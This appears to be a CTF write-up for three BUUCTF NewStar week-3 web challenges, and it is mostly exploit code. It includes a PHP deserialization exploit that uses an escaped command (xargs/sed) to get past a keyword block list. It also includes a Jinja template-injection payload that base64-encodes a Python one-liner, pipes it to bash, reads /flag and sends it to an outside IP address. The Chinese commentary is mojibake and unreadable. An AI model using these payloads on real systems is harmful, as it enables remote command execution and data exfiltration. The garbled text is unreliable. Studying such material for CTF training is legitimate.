## newstar BUUCTF weak3 R!!!C!!!E!!!


```php
<?php
highlight_file(__FILE__);
class minipop{
    public $code;
    public $qwejaskdjnlka;
    public function __toString()
    {
        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
            exec($this->code);
        }
        return "alright";
    }
    public function __destruct()
    {
        echo $this->qwejaskdjnlka;
    }
}
if(isset($_POST['payload'])){
    //wanna try?
    unserialize($_POST['payload']);
} 
```

expï¼Œåˆ©ç”¨`sed`æ›¿æ¢`isset`ä¸º`system`ï¼Œç„¶åå‘½ä»¤æ‰§è¡Œ

```php
<?php

class minipop{
    public $code;
    public $qwejaskdjnlka;
    public function __toString()
    {
        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
            //exec($this->code);
        }
        return "alright";
    }
    public function __destruct()
    {
        echo $this->qwejaskdjnlka;
    }
}
$a = new minipop;
$a->qwejaskdjnlka = new minipop;
$a->qwejaskdjnlka->code = 'l\s | xar\gs s\ed -i "s/isset/system/"';
    echo serialize($a);
var_dump(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $a->qwejaskdjnlka->code));
```

## newstar BUUCTF weak3 GenShin

å“åº”åŒ…é‡Œé¢æœ‰æç¤ºè·¯ç”±`secr3tofpop`

```
payload:
http://5340cea9-ec26-458f-8a05-b0f5eb877cf7.node4.buuoj.cn:81/secr3tofpop
?name={% print(namespace["__%cnit__" % 105].__globals__.os.system("echo cHl0aG9uIC1jICJpbXBvcnQgcmVxdWVzdHM7IGltcG9ydCBvcztpbXBvcnQgYmFzZTY0O2ZsYWcgPSAgYmFzZTY0LmI2NGVuY29kZShvcy5wb3BlbignY2F0IC9mbGFnJykucmVhZCgpLmVuY29kZSgpKS5kZWNvZGUoKTtyZXNwb25zZSA9IHJlcXVlc3RzLmdldCgnaHR0cDovLzQzLjE0My4yMjIuMTYyOjgwODMvJytmbGFnKTsi| base64 -d | bash")) %}

åœ¨å…¬ç½‘æœåŠ¡å™¨å¼€ä¸€ä¸ªä¸´æ—¶æœåŠ¡å™¨ï¼Œç”¨äºæ¥å—è¯·æ±‚è·¯å¾„ä»¥è·å–flag
```

## newstar BUUCTF weak3 Include ğŸ

[Docker PHPè£¸æ–‡ä»¶æœ¬åœ°åŒ…å«ç»¼è¿° | ç¦»åˆ«æ­Œ (leavesongs.com)](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)

